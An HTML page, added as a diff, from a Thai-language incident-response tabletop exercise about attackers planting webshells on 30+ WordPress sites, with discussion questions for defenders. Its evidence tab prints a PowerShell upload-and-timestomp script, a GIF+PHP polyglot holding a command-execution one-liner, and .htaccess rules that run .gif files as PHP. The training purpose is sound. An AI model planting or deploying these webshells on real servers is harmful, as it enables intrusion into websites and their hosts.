@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Inject 4: Post-Incident Recovery — TTX User Dashboard</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Thai:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg-card: #111827;
+  --bg-card-hover: #1a2332;
+  --bg-sidebar: #0d1321;
+  --border: #1e293b;
+  --border-accent: #2563eb;
+  --text: #e2e8f0;
+  --text-muted: #94a3b8;
+  --text-dim: #64748b;
+  --accent: #3b82f6;
+  --accent-hover: #60a5fa;
+  --green: #22c55e;
+  --green-bg: rgba(34,197,94,0.1);
+  --orange: #f59e0b;
+  --orange-bg: rgba(245,158,11,0.1);
+  --red: #ef4444;
+  --red-bg: rgba(239,68,68,0.1);
+  --blue: #06b6d4;
+  --blue-bg: rgba(6,182,212,0.1);
+  --purple: #a855f7;
+  --purple-bg: rgba(168,85,247,0.1);
+  --radius: 16px;
+  --radius-sm: 10px;
+  --shadow: 0 8px 32px rgba(0,0,0,0.25);
+  --transition: 0.2s ease;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: 'IBM Plex Sans Thai', 'Sarabun', 'Inter', sans-serif;
+  font-size: 17px;
+  line-height: 1.75;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+}
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--text-dim); }
+
+/* ===== Top Navigation ===== */
+.topnav {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  background: rgba(13,19,33,0.92);
+  backdrop-filter: blur(8px);
+  border-bottom: 1px solid var(--border);
+}
+.topnav-inner {
+  max-width: 1120px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 12px 20px;
+  overflow-x: auto;
+  white-space: nowrap;
+}
+.topnav-brand {
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--accent);
+  letter-spacing: 0.5px;
+  margin-right: 12px;
+  flex-shrink: 0;
+}
+.topnav-link {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  padding: 8px 14px;
+  border-radius: 8px;
+  font-size: 14px;
+  font-weight: 500;
+  color: var(--text-muted);
+  transition: all var(--transition);
+  flex-shrink: 0;
+}
+.topnav-link:hover { color: var(--text); background: rgba(59,130,246,0.08); }
+.topnav-link.active { color: var(--accent); background: rgba(59,130,246,0.12); }
+.topnav-sep { width: 1px; height: 22px; background: var(--border); margin: 0 6px; flex-shrink: 0; }
+
+/* ===== Main ===== */
+.main {
+  max-width: 1120px;
+  margin: 0 auto;
+  padding: 32px 20px 60px;
+}
+
+/* ===== Inject Header ===== */
+.inject-header {
+  border-radius: 16px;
+  padding: 28px;
+  margin-bottom: 20px;
+  border: 1px solid var(--border);
+}
+.inject-header h2 { font-size: 22px; font-weight: 700; margin-bottom: 4px; line-height: 1.4; }
+.inject-header .meta { display: flex; gap: 16px; margin-top: 8px; flex-wrap: wrap; }
+.inject-header .meta span { font-size: 14px; color: var(--text-muted); display: flex; align-items: center; gap: 4px; }
+
+/* ===== Tabs ===== */
+.tabs {
+  display: flex;
+  gap: 4px;
+  margin-bottom: 20px;
+  overflow-x: auto;
+  padding-bottom: 4px;
+  border-bottom: 1px solid var(--border);
+}
+.tab-btn {
+  padding: 10px 20px;
+  border: none;
+  border-radius: 8px;
+  background: transparent;
+  color: var(--text-muted);
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all var(--transition);
+  white-space: nowrap;
+  font-family: inherit;
+  border-bottom: 2px solid transparent;
+}
+.tab-btn:hover { color: var(--text); background: rgba(255,255,255,0.03); }
+.tab-btn.active { color: white; background: var(--accent); border-bottom-color: var(--accent); }
+.tab-content { display: none; animation: fadeIn 0.2s ease; }
+.tab-content.active { display: block; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+/* ===== Cards ===== */
+.card {
+  background: linear-gradient(135deg, rgba(17,24,39,0.95), rgba(15,23,42,0.98));
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 16px;
+  padding: 28px;
+  margin-bottom: 20px;
+  box-shadow: 0 8px 32px rgba(0,0,0,0.25);
+  transition: all 0.3s ease;
+}
+.card:hover {
+  border-color: rgba(59,130,246,0.3);
+  transform: translateY(-2px);
+  box-shadow: 0 12px 40px rgba(0,0,0,0.35);
+}
+.card-header { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
+.card-icon {
+  width: 40px; height: 40px;
+  border-radius: var(--radius-sm);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 18px;
+  flex-shrink: 0;
+}
+.card-title { font-size: 20px; font-weight: 600; color: var(--text); }
+.card-subtitle { font-size: 14px; color: var(--text-dim); }
+
+/* ===== Tables ===== */
+table { width: 100%; border-collapse: separate; border-spacing: 0; margin: 12px 0; }
+th, td { padding: 14px 16px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 15px; }
+th { font-weight: 600; color: var(--text); background: rgba(59,130,246,0.15); font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; }
+td { color: var(--text-muted); }
+tbody tr { transition: background var(--transition); }
+tbody tr:hover { background: rgba(255,255,255,0.03); }
+
+/* ===== Evidence ===== */
+.evidence-block {
+  background: rgba(0,0,0,0.3);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  margin: 12px 0;
+  overflow: hidden;
+}
+.evidence-title {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 14px 18px;
+  cursor: pointer;
+  transition: background var(--transition);
+  font-size: 15px;
+  font-weight: 500;
+  color: var(--text-muted);
+}
+.evidence-title:hover { background: rgba(255,255,255,0.03); }
+.evidence-title .arrow { transition: transform 0.2s ease; font-size: 12px; }
+.evidence-title.open .arrow { transform: rotate(90deg); }
+.evidence-title-inner { display: flex; align-items: center; flex: 1; min-width: 0; gap: 8px; flex-wrap: wrap; }
+.evidence-dl {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  padding: 4px 10px;
+  background: rgba(34,197,94,0.1);
+  border: 1px solid rgba(34,197,94,0.3);
+  border-radius: 6px;
+  color: var(--green);
+  font-size: 12px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all var(--transition);
+  white-space: nowrap;
+  margin-left: 8px;
+  flex-shrink: 0;
+}
+.evidence-dl:hover { background: rgba(34,197,94,0.2); border-color: var(--green); transform: translateY(-1px); }
+.evidence-dl:active { transform: translateY(0); }
+.evidence-body { display: none; padding: 0 18px 18px; }
+.evidence-body.open { display: block; }
+pre {
+  background: rgba(0,0,0,0.4);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 16px;
+  overflow-x: auto;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #c9d1d9;
+  margin: 8px 0;
+}
+
+/* ===== IoC ===== */
+.ioc-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+  gap: 12px;
+  margin: 12px 0;
+}
+.ioc-item {
+  background: rgba(255,255,255,0.03);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 16px;
+}
+.ioc-label {
+  font-size: 13px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  color: var(--text-dim);
+  margin-bottom: 4px;
+}
+.ioc-value {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 15px;
+  color: var(--orange);
+  word-break: break-all;
+}
+
+/* ===== Questions ===== */
+.question-card {
+  background: rgba(255,255,255,0.03);
+  border: 1px solid rgba(59,130,246,0.15);
+  border-left: 4px solid var(--accent);
+  border-radius: 12px;
+  padding: 20px 24px;
+  margin: 10px 0;
+}
+.question-num {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 32px;
+  height: 32px;
+  font-size: 14px;
+  font-weight: 700;
+  color: white;
+  background: var(--accent);
+  border-radius: 50%;
+  margin-bottom: 8px;
+}
+.question-text { font-size: 17px; color: var(--text); line-height: 1.7; }
+
+/* ===== MITRE ===== */
+.mitre-tags { display: flex; flex-wrap: wrap; gap: 6px; margin: 8px 0; }
+.mitre-tag {
+  display: inline-block;
+  padding: 4px 10px;
+  border-radius: 20px;
+  font-size: 13px;
+  font-weight: 500;
+  font-family: 'JetBrains Mono', monospace;
+}
+
+/* ===== Badges ===== */
+.badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  padding: 4px 12px;
+  border-radius: 20px;
+  font-size: 13px;
+  font-weight: 500;
+}
+.badge-green { background: var(--green-bg); color: var(--green); }
+.badge-orange { background: var(--orange-bg); color: var(--orange); }
+.badge-red { background: var(--red-bg); color: var(--red); }
+.badge-blue { background: var(--blue-bg); color: var(--blue); }
+.badge-purple { background: var(--purple-bg); color: var(--purple); }
+
+/* ===== Nav Arrows ===== */
+.nav-arrows { display: flex; justify-content: space-between; margin-top: 32px; padding-top: 20px; border-top: 1px solid var(--border); }
+.nav-arrow-btn {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 12px 24px;
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  background: var(--bg-card);
+  color: var(--text-muted);
+  font-size: 14px;
+  cursor: pointer;
+  transition: all var(--transition);
+  font-family: inherit;
+  text-decoration: none;
+}
+.nav-arrow-btn:hover {
+  border-color: var(--accent);
+  color: var(--accent);
+  transform: translateY(-1px);
+  box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+}
+.nav-arrow-btn.next { margin-left: auto; }
+
+/* ===== Utility ===== */
+.highlight { color: var(--accent); font-weight: 600; }
+.highlight-green { color: var(--green); font-weight: 600; }
+.highlight-orange { color: var(--orange); font-weight: 600; }
+.highlight-red { color: var(--red); font-weight: 600; }
+.highlight-blue { color: var(--blue); font-weight: 600; }
+.highlight-purple { color: var(--purple); font-weight: 600; }
+.text-muted { color: var(--text-muted); }
+.text-dim { color: var(--text-dim); }
+
+.footer {
+  border-top: 1px solid var(--border);
+  padding: 24px;
+  text-align: center;
+  font-size: 13px;
+  color: var(--text-dim);
+}
+
+@media (max-width: 768px) {
+  .main { padding: 20px 14px 40px; }
+  .inject-header { padding: 20px; }
+  .inject-header h2 { font-size: 18px; }
+  .card { padding: 20px; }
+  .card-title { font-size: 18px; }
+  .ioc-grid { grid-template-columns: 1fr; }
+  .nav-arrows { flex-direction: column; gap: 10px; }
+  .nav-arrow-btn { justify-content: center; }
+  .nav-arrow-btn.next { margin-left: 0; }
+}
+</style>
+</head>
+<body>
+<nav class="topnav">
+  <div class="topnav-inner">
+    <span class="topnav-brand">TTX · Phantom Tide</span>
+    <a class="topnav-link" href="../index.html">&#127968; หน้าหลัก</a>
+    <span class="topnav-sep"></span>
+    <a class="topnav-link" href="../Inject1/index.html">Inject 1</a>
+    <a class="topnav-link" href="../Inject2/index.html">Inject 2</a>
+    <a class="topnav-link" href="../Inject3/index.html">Inject 3</a>
+    <a class="topnav-link active" href="index.html">Inject 4</a>
+  </div>
+</nav>
+
+<main class="main">
+  <!-- ===== Inject Header ===== -->
+  <div class="inject-header" style="background:linear-gradient(135deg,rgba(168,85,247,0.08),rgba(168,85,247,0.02));border-color:rgba(168,85,247,0.3)">
+    <h2><span class="badge badge-purple">&#9679; PURPLE</span>&nbsp; Inject 4: Post-Incident Recovery — การกู้คืนและรายงานเหตุ</h2>
+    <div class="meta">
+      <span>&#128337; 14:30 - 15:30 (60 นาที)</span>
+      <span>&#127919; Phase: Persistence / Defense Evasion</span>
+      <span>&#128200; ระดับ: ร้ายแรง</span>
+    </div>
+  </div>
+
+  <!-- ===== Tabs ===== -->
+  <div class="tabs" id="tabs-inj4">
+    <button class="tab-btn active" onclick="switchTab('inj4','scenario')">&#128196; สถานการณ์</button>
+    <button class="tab-btn" onclick="switchTab('inj4','evidence')">&#128269; หลักฐาน</button>
+    <button class="tab-btn" onclick="switchTab('inj4','ioc')">&#9888; IoC</button>
+    <button class="tab-btn" onclick="switchTab('inj4','questions')">&#10067; คำถาม</button>
+  </div>
+
+  <!-- ===== Tab: Scenario ===== -->
+  <div class="tab-content active" id="inj4-tab-scenario">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:12px">&#127908; สถานการณ์</h3>
+      <div style="background:rgba(168,85,247,0.05);border:1px solid rgba(168,85,247,0.2);border-radius:var(--radius-sm);padding:16px;margin:12px 0">
+        <p style="color:var(--text);line-height:1.8">
+          &#8220;สถานการณ์ร้ายแรงขึ้นอีกขั้น — ผู้โจมตีตัดสินใจ deploy webshells ไปยัง WordPress sites ทั้งหมด
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px">
+          เวลาประมาณ 14:30 น. ผู้โจมตีใช้ <code>deploymf.ps1</code> (PowerShell script) จาก
+          <span class="highlight-red">192.168.2.45</span> เพื่อ deploy webshells
+          ไปยัง <span class="highlight-red">WordPress sites 30+ sites</span> ทั่ว organization
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px">
+          Webshells ถูกซ่อนไว้ใน <span class="highlight-orange">Polyglot GIF + PHP</span>
+          — ไฟล์ .gif ที่มี PHP code ฝังอยู่ด้านใน
+          และใช้ <span class="highlight-orange">.htaccess</span> เพื่อให้ Apache
+          execute PHP จากไฟล์ .gif
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px">
+          ที่น่ากังวลที่สุดคือ ผู้โจมตีใช้ <span class="highlight-red">timestomping</span>
+          บนไฟล์ webshell ทั้งหมด เพื่อปลอม timestamp ให้เหมือนไฟล์เดิมของ system
+          ทำให้การค้นหาจาก file timestamp เป็นไปได้ยากมาก
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px">
+          ผู้โจมตีมี webshell ที่ทำงานอยู่แล้ว:
+          <code>news_th-.gif</code>, <code>dada9527.phtml</code>, <code>fm661.php</code>,
+          <code>.htaccess</code> (mod_rewrite), <code>go4_bg.phtml</code> และ
+          <code>sshx628413.php</code> (SSH tunnel) ทั้งหมดยัง active อยู่
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:12px">
+          &#8220;ตอนนี้ผู้โจมตีมี foothold ที่มั่นคงบน servers จำนวนมาก
+          ทั้ง persistent, ซ่อนตัวจาก file timestamp, และใช้ polyglot techniques
+          ผู้เข้าร่วมควรค้นหา webshells เหล่านี้อย่างไร?&#8221;
+        </p>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:12px">&#127919; MITRE ATT&amp;CK</h3>
+      <div class="mitre-tags">
+        <span class="mitre-tag" style="background:rgba(168,85,247,0.1);color:var(--purple)">T1505.003 - Web Shell</span>
+        <span class="mitre-tag" style="background:rgba(168,85,247,0.1);color:var(--purple)">T1036.005 - Match Legitimate Name or Location</span>
+        <span class="mitre-tag" style="background:rgba(168,85,247,0.1);color:var(--purple)">T1574.001 - DLL Search Order Hijacking</span>
+        <span class="mitre-tag" style="background:rgba(168,85,247,0.1);color:var(--purple)">T1070.006 - Timestomp</span>
+        <span class="mitre-tag" style="background:rgba(168,85,247,0.1);color:var(--purple)">T1059.001 - PowerShell</span>
+        <span class="mitre-tag" style="background:rgba(168,85,247,0.1);color:var(--purple)">T1570 - Lateral Tool Transfer</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Tab: Evidence ===== -->
+  <div class="tab-content" id="inj4-tab-evidence">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐานที่ 1: deploymf.ps1 Script</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; deploymf.ps1</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre># PowerShell Deployment Script
+# Source: 192.168.2.45
+# Deployed to: 30+ WordPress sites
+
+$targets = @(
+    "http://192.168.11.10/wp-content/uploads/",
+    "http://192.168.11.11/wp-content/uploads/",
+    "http://192.168.11.12/wp-content/uploads/",
+    "http://192.168.11.13/wp-includes/",
+    "http://192.168.11.14/wp-content/themes/",
+    # ... 25+ more WordPress targets
+    "http://192.168.11.35/wp-content/uploads/"
+)
+
+foreach ($target in $targets) {
+    # Upload polyglot GIF+PHP webshell
+    $webshell = Get-Content "news_th-.gif" -Raw
+    Invoke-WebRequest -Uri "$target" -Method POST `
+        -Form @{file=@{Content=$webshell; FileName="news_th-.gif"; ContentType="image/gif"}}
+
+    # Deploy .htaccess to enable PHP execution in uploads
+    $htaccess = @"
+    AddType application/x-httpd-php .gif
+    AddHandler php-script .gif
+    php_flag engine on
+    "@
+    Invoke-WebRequest -Uri "$target" -Method POST `
+        -Form @{file=@{Content=$htaccess; FileName=".htaccess"}}
+
+    # Timestomp deployed files
+    $original = Get-Item "$target/branding.gif"
+    [System.IO.File]::SetCreationTime("$target/news_th-.gif", $original.CreationTime)
+    [System.IO.File]::SetLastWriteTime("$target/news_th-.gif", $original.LastWriteTime)
+}
+
+Write-Host "Deployed webshells to $($targets.Count) sites"</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐานที่ 2: Polyglot GIF+PHP Webshell</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; news_th-.gif (polyglot)</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre># Polyglot File Analysis
+# File type: GIF89a (valid GIF header) + embedded PHP
+# Magic bytes: 47 49 46 38 39 61 (GIF89a)
+
+00000000: 4749 4638 3961 0100 0100 8000 00ff 00ff  GIF89a...........
+00000010: ff00 0000 21f9 0401 0000 0000 2c00 0000  ....!.......,...
+00000020: 0001 0001 0000 0202 4401 003b 0a3c 3f70  ..........D....<?p
+00000030: 6870 2073 7973 7465 6d28 245f 4745 545b  hp system($_GET[
+00000040: 2263 6d64 225d 293b 203f 3e0a              "cmd"]); ?&gt;.
+
+# The PHP code is embedded AFTER the GIF "End of Image" marker (0x3B)
+# Browsers render it as a valid image
+# Apache with .htaccess AddHandler processes it as PHP
+# File size: 1,847 bytes (looks like a normal image)
+
+# Additional webshells found:
+# dada9527.phtml - same hash as Inject 1 (cross-site deployment)
+# fm661.php - PHP webshell with file manager
+# go4_bg.phtml - background image webshell
+# sshx628413.php - SSH tunnel webshell</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐานที่ 3: .htaccess Persistence</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; .htaccess (planted)</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre># Apache .htaccess planted by attacker
+# Purpose: Execute .gif files as PHP
+
+# === Suspicious .htaccess found in: /wp-content/uploads/2026/07/ ===
+AddType application/x-httpd-php .gif
+AddHandler php-script .gif
+php_flag engine on
+
+# Also found in wp-includes/ and wp-content/themes/
+# These allow PHP execution in directories that normally shouldn't run PHP
+
+# Normal .htaccess for comparison:
+# &lt;FilesMatch "\.(php|html)$"&gt;
+#   SetHandler application/x-httpd-php
+# &lt;/FilesMatch&gt;</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐานที่ 4: Timestomp Detection</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; timestomp_detection.sh</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre>#!/bin/bash
+# Detect timestomping by comparing MAC times
+# Modified time vs inode change time vs creation time
+
+find /var/www/html -name "*.gif" -newer /etc/hostname | while read f; do
+    mtime=$(stat -c %Y "$f")        # modification time
+    ctime=$(stat -c %Z "$f")        # inode change time
+    if [ "$mtime" -ne "$ctime" ]; then
+        echo "TIMESTOMPED: $f"
+        echo "  mtime: $(date -d @$mtime)"
+        echo "  ctime: $(date -d @$ctime)"
+    fi
+done
+
+# Results:
+# TIMESTOMPED: /wp-content/uploads/2026/07/news_th-.gif
+#   mtime: 2025-03-15 10:22:33 (forged)
+#   ctime: 2026-07-12 14:35:12 (actual creation)
+
+# TIMESTOMPED: /wp-content/uploads/2026/07/.htaccess
+#   mtime: 2025-03-15 10:22:33 (forged)
+#   ctime: 2026-07-12 14:35:45 (actual creation)
+
+# Total: 34 files with timestomped attributes across 30+ sites</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Tab: IoC ===== -->
+  <div class="tab-content" id="inj4-tab-ioc">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#9888; Indicators of Compromise (IoC)</h3>
+      <div class="ioc-grid">
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--red)">Deploy Source</div>
+          <div class="ioc-value">192.168.2.45</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--red)">Deploy Script</div>
+          <div class="ioc-value">deploymf.ps1 (PowerShell)</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--purple)">Polyglot Webshell</div>
+          <div class="ioc-value">news_th-.gif (GIF89a + PHP)</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--orange)">Persistence Files</div>
+          <div class="ioc-value">.htaccess (AddHandler php-script .gif)</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--purple)">Known Webshells</div>
+          <div class="ioc-value">dada9527.phtml, fm661.php, go4_bg.phtml</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--red)">SSH Tunnel</div>
+          <div class="ioc-value">sshx628413.php</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--orange)">Evasion Technique</div>
+          <div class="ioc-value">Timestomping (34 files)</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--red)">Compromised Sites</div>
+          <div class="ioc-value">30+ WordPress sites</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--text-dim)">Webshell Password</div>
+          <div class="ioc-value">dada9527 (same as Inject 1)</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--text-dim)">Affected Directories</div>
+          <div class="ioc-value">wp-content/uploads/, wp-includes/, wp-content/themes/</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Tab: Questions ===== -->
+  <div class="tab-content" id="inj4-tab-questions">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#10067; คำถามสำหรับผู้เข้าร่วม</h3>
+      <div class="question-card">
+        <div class="question-num">Q1</div>
+        <div class="question-text">IRP ควร activation ขั้นตอนไหน? ใครเป็น decision maker? ควร follow ขั้นตอนใดบ้าง?</div>
+      </div>
+      <div class="question-card">
+        <div class="question-num">Q2</div>
+        <div class="question-text">Recovery priority ควรเริ่มจากส่วนไหนก่อน? SRM ที่เป็น production? หรือ WordPress sites ที่มีจำนวนมาก?</div>
+      </div>
+      <div class="question-card">
+        <div class="question-num">Q3</div>
+        <div class="question-text">ควรเปิดเผยข้อมูลใดต่อสาธารณะ? อะไรที่ไม่ควรเปิดเผย? อย่างไรถึงจะดูน่าเชื่อถือ?</div>
+      </div>
+      <div class="question-card">
+        <div class="question-num">Q4</div>
+        <div class="question-text">ควรแจ้ง สกมช. อย่างไร? ต้องใช้แบบฟอร์มอะไร? ข้อมูลใดบ้างที่ต้องรายงาน?</div>
+      </div>
+      <div class="question-card">
+        <div class="question-num">Q5</div>
+        <div class="question-text">3 สิ่งที่ต้องทำภายใน 30 วันหลังเหตุการณ์คืออะไร?</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Nav Arrows ===== -->
+  <div class="nav-arrows">
+    <a class="nav-arrow-btn" href="../Inject3/index.html">&#8592; Inject 3: Data Exfiltration</a>
+    <a class="nav-arrow-btn next" href="../index.html">หน้าหลัก &#8594;</a>
+  </div>
+</main>
+
+<footer class="footer">
+  Inject 4: Post-Incident Recovery — Operation Phantom Tide: Water Under Siege
+</footer>
+
+<script>
+// ========== Tabs ==========
+function switchTab(injectId, tabName) {
+  const tabsContainer = document.getElementById('tabs-' + injectId);
+  if (!tabsContainer) return;
+  const btns = tabsContainer.querySelectorAll('.tab-btn');
+  btns.forEach(b => b.classList.remove('active'));
+  const targetBtn = Array.from(btns).find(b => {
+    const onclick = b.getAttribute('onclick');
+    return onclick && onclick.includes(tabName);
+  });
+  if (targetBtn) targetBtn.classList.add('active');
+  const mainEl = tabsContainer.closest('.main');
+  if (!mainEl) return;
+  const contents = mainEl.querySelectorAll('.tab-content');
+  contents.forEach(c => c.classList.remove('active'));
+  const targetId = injectId + '-tab-' + tabName;
+  const target = document.getElementById(targetId);
+  if (target) target.classList.add('active');
+}
+
+// ========== Evidence Toggle ==========
+function toggleEvidence(element) {
+  element.classList.toggle('open');
+  const body = element.nextElementSibling;
+  if (body) body.classList.toggle('open');
+}
+
+// ========== Evidence Download ==========
+function downloadEvidence(btn, e) {
+  e.stopPropagation();
+  const title = btn.closest('.evidence-title');
+  const block = title.closest('.evidence-block');
+  const body = block.querySelector('.evidence-body pre');
+  if (!body) return;
+  const filenameSpan = title.querySelector('.evidence-title-inner span') || title.querySelector('span');
+  let filename = filenameSpan ? filenameSpan.textContent.replace(/^[\u{1F4C4}\u{1F4CB}\u{1F4DD}]\s*/u, '').trim() : 'evidence.txt';
+  if (!filename.match(/\.(txt|log|json|xml|csv|md|php|py|ps1|yml|yaml|sh|phtml|gif)$/i)) {
+    filename += '.txt';
+  }
+  const content = body.textContent;
+  const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+}
+
+// Add download buttons to all evidence blocks dynamically
+document.querySelectorAll('.evidence-title').forEach(title => {
+  const span = title.querySelector('span');
+  if (!span) return;
+  const dlBtn = document.createElement('button');
+  dlBtn.className = 'evidence-dl';
+  dlBtn.innerHTML = '&#11015; Download';
+  dlBtn.onclick = function(e) { downloadEvidence(this, e); };
+  title.insertBefore(dlBtn, title.querySelector('.arrow'));
+});
+</script>
+</body>
+</html>
